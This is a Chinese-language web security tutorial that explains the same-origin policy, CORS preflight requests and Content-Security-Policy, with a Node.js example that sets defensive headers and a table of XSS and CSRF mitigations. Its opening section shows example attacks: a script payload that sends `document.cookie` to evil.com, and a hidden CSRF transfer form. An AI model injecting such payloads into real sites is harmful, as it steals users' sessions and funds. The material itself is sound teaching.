---
title: 概念 15 · 同源策略、CORS 预检与 CSP
---

# 概念 15｜同源策略、CORS 预检与 CSP（浏览器三大安全保镖）

> **一句话人话定义**：
> - **同源策略（Same-Origin Policy）**：浏览器自带的防盗隔离墙——规定 `evil.com` 网页里的 JS 脚本**绝不准偷看** `bank.com` 接口返回的数据；
> - **CORS（跨域资源共享）**：服务器贴在响应头上的“官方放行条”（`Access-Control-Allow-Origin`），明确告诉浏览器：“`app.com` 是我自己人，准许它读取我的响应数据！”；
> - **CSP（内容安全策略）**：服务器下发给浏览器的“可执行脚本白名单圣旨”（`Content-Security-Policy`），命令浏览器：“哪怕页面被人注入了恶意 `<script>`，只要不在白名单里，一律当场废除禁止执行！”

## 1. 它们被什么痛点逼出来的？

很多前端新手被跨域报错折磨时都会抱怨：*“Postman 发请求好好的，为什么偏偏浏览器这么事儿妈，非要搞出‘同源策略’拦着我调接口？”*

请试想一下，如果明天的浏览器突然取消了同源策略，会发生多恐怖的事：
1. **灾难一（钓鱼网站跨站偷光你的存款——逼出同源策略 + CORS）**：
   你早上在浏览器里登录了网银 `https://bank.com`，浏览器自动帮你存下了网银的登录 Cookie。
   中午你不小心点开了一个免费看电影的钓鱼网站 `https://evil.com`。如果没有同源策略，`evil.com` 页面里的恶意 JS 脚本直接悄悄发一句 `fetch('https://bank.com/api/my-info', { credentials: 'include' })`——浏览器会自动带上你的网银 Cookie，把你的存款余额、身份证号和交易记录原封不动地读出来发给黑客！
2. **灾难二（顺手牵羊伪造转账——CSRF 跨站请求伪造）**：
   哪怕 `evil.com` 读不到返回结果，它直接在页面里塞一个自动提交的隐藏表单 `<form action="https://bank.com/api/transfer" method="POST">`，趁你登录态没过期，以你的名义给黑客转走 1 万块！
3. **灾难三（往评论区塞毒代码——XSS 跨站脚本攻击，逼出 CSP）**：
   黑客在论坛评论区发了一条评论，内容不是文字，而是一段代码：`<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>`。如果网站没做转义直接渲染到页面上，所有打开这篇帖子的用户，浏览器都会误以为这是网站自己的合法脚本而当场执行，全员账号被盗！

为了挡住这三大夺命攻击，浏览器和服务端联合立下了三道铁闸。

---

## 2. 逐帧慢放：跨域拦截的物理位置与 `OPTIONS` 预检请求全流程

### 镜头一：破除最大误区——跨域报错时，请求到底发出去没有？

90% 的初学者以为：“控制台报 CORS 跨域错误，说明浏览器压根没把请求发出去，或者服务器报错了。”
**真相完全相反！对于普通的 GET/POST 请求，请求不仅实打实发出去了，服务器也实打实处理并返回了 200 状态码和完整 JSON 数据！真正扣留数据的是“浏览器海关”！**

```text
【普通跨域请求的真实物理轨迹（比如从 https://a.com 请求 https://api.b.com/users）】

  浏览器 JS 代码               浏览器安全海关                   后端服务器 (api.b.com)
       │                             │                                  │
       ├─ 1. fetch('/users') ───────►├─ 2. 贴上标签 Origin: https://a.com│
       │                             ├─────────────────────────────────►│
       │                             │                                  ├─ 3. 服务器正常查库！
       │                             │  4. 返回 200 OK + 真实用户数据   │
       │                             │◄─────────────────────────────────┤
       │                             │
       │                       ┌─────┴────────────────────────────────────────┐
       │                       │ 5. 【浏览器海关开箱检查响应头】：            │
       │                       │   - 有 Access-Control-Allow-Origin: a.com 吗？│
       │                       │     ✔ 有：放行！把数据交给左边的 JS 代码。   │
       │                       │     ✘ 无：当场把数据销毁，给 JS 抛红色 CORS 错│
       │                       └──────────────────────────────────────────────┘
```

### 镜头二：为什么有时候 Network 面板里会多出一个神秘的 `OPTIONS` 请求？（Preflight 预检）

再想一个漏洞：
刚才说普通请求是“先发给服务器执行，回来时浏览器再检查放行条”。
那万一这是一个 **`DELETE https://api.b.com/users/1`（删库请求）**，或者带了 **`Content-Type: application/json`**、自定义头 **`Authorization: Bearer xxx`** 的复杂请求呢？
如果还是“先发过去把用户删了，回来时浏览器发现没放行条再报错”，**虽然 JS 没拿到响应，但服务器数据库里的用户已经被删掉了啊！**

所以浏览器定下规矩：凡是可能对服务器造成意外修改的**“非简单请求”**，在发出真正的业务请求之前，浏览器必须先自动发一个不带任何业务数据的 **`OPTIONS` 探路问路包（叫 Preflight 预检请求）**：

```text
浏览器安全海关 (Origin: https://app.com)                         后端服务器 (https://api.com)
   │                                                                   │
   ├─ 第 1 步【先发 OPTIONS 预检探路包（不带业务 Body，只问准不准）】：│
   │    OPTIONS /orders HTTP/1.1                                       │
   │    Origin: https://app.com                                        │
   │    Access-Control-Request-Method: POST                            │
   │    Access-Control-Request-Headers: content-type, authorization    │
   ├──────────────────────────────────────────────────────────────────►│
   │                                                                   │
   │  第 2 步【服务器核对名单，返回 204 预检通行证】：                 │
   │    HTTP/1.1 204 No Content                                        │
   │    Access-Control-Allow-Origin: https://app.com                   │
   │    Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS  │
   │    Access-Control-Allow-Headers: Content-Type, Authorization      │
   │    Access-Control-Max-Age: 86400  ◄── 关键优化：这张通行证管用24小时！│
   │◄──────────────────────────────────────────────────────────────────┤
   │                                                                   │
   ├─ 第 3 步【拿到通行证！发出真正的 POST /orders 业务请求】─────────►│
```

*(💡 架构师性能锦囊：一定要让后端或网关加上 `Access-Control-Max-Age: 86400`！否则前端每发一次 POST 接口都要多花一个网络来回发一次 `OPTIONS` 预检，接口耗时直接翻倍！)*

---

## 3. 代码逐行带入走读：25 行手写网关级 CORS + CSP + 防御响应头

```js
import http from 'node:http'

const ALLOWED_ORIGINS = new Set(['https://app.example.com', 'http://localhost:5173'])

http.createServer((req, res) => {
  const origin = req.headers.origin

  // 1. CORS 放行条：严格核对来访 Origin 是否在白名单内（带凭证时严禁写死通配符 *！）
  if (ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin)
    res.setHeader('Access-Control-Allow-Credentials', 'true') // 允许携带 Cookie
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS')
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Idempotency-Key')
    res.setHeader('Access-Control-Max-Age', '86400')          // 缓存预检结果 24 小时
  }

  // 2. 拦截浏览器的 OPTIONS 预检探路请求，直接 204 快速放行，绝不进后续业务逻辑
  if (req.method === 'OPTIONS') {
    res.writeHead(204)
    return res.end()
  }

  // 3. CSP 内容安全策略圣旨：只准加载同源及指定 CDN 的脚本，彻底废掉一切内联 XSS 脚本！
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://cdn.example.com; object-src 'none'"
  )

  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ status: 'secure' }))
})
```

---

## 4. 前后端安全攻防全景速查表

| 攻击/问题类型 | 攻击是怎么得手的？ | 前端 + 后端联防根治方案 |
| :--- | :--- | :--- |
| **CORS 跨域报错** | 前端页面域名（如 `localhost:5173`）与接口域名（`api.prod.com`）的**协议、域名、端口**三者有任何一个不同。 | 1. **本地开发**：配置 Vite `server.proxy`（用本地 Node 开发服务器转发请求，因为服务器对服务器没有同源策略限制）；<br>2. **生产环境**：优先用 Nginx 反向代理将前端与 `/api` 收敛在同一域名下（彻底免去跨域与 `OPTIONS` 预检），或在网关层规范配置 CORS 响应头。 |
| **XSS（跨站脚本攻击）** | 恶意脚本被注入到页面 DOM 中并被浏览器当成真代码执行，偷取 `localStorage` 中的 Token 或代发请求。 | 1. **输入输出转义**：坚持用 Vue `{{ }}` / React `{ }` 自动转义，严禁将用户富文本直接塞入 `v-html` / `dangerouslySetInnerHTML`（必须用时先过 `DOMPurify.sanitize()` 消毒）；<br>2. **敏感凭证隔离**：登录态 Cookie 开启 `HttpOnly`（禁止 `document.cookie` 读取）；<br>3. **终极底线 CSP**：下发 `Content-Security-Policy` 响应头，禁止内联脚本与向陌生域名外发数据。 |
| **CSRF（跨站请求伪造）** | 用户在钓鱼网站点击链接，钓鱼网站利用浏览器“发请求会自动携带目标域 Cookie”的习性，冒用用户身份发改密/转账请求。 | 1. **Cookie 加设 `SameSite=Lax` 或 `Strict`**：禁止第三方网站跨站发 POST 请求时自动夹带 Cookie；<br>2. **使用自定义 Header 传 Token（如 `Authorization: Bearer ...`）或 CSRF Token**：因为钓鱼网站受同源策略限制，既读不到 Token 也无法跨域伪造自定义 Header。 |

> 🔙 **返回主线教程**：[第 13 讲：前端性能治理、安全攻防与监控 SDK](../01-教程/第13讲-前端性能治理安全攻防与监控SDK.md) ｜ [第 14 讲：一次请求出门](../01-教程/第14讲-一次请求出门DNS-TCP-TLS与HTTP演进.md)  
> 🧪 **亲手验证本概念**：[实验 10：手写前端错误捕获与性能监控探针](../03-实验/实验10-手写前端错误与性能监控探针.md)  
> 👉 **下一篇概念（进入 C 辑网络与分布式内核）**：[概念 16｜TCP 三次握手、字节流与队头阻塞](./16-TCP三次握手与队头阻塞.md)
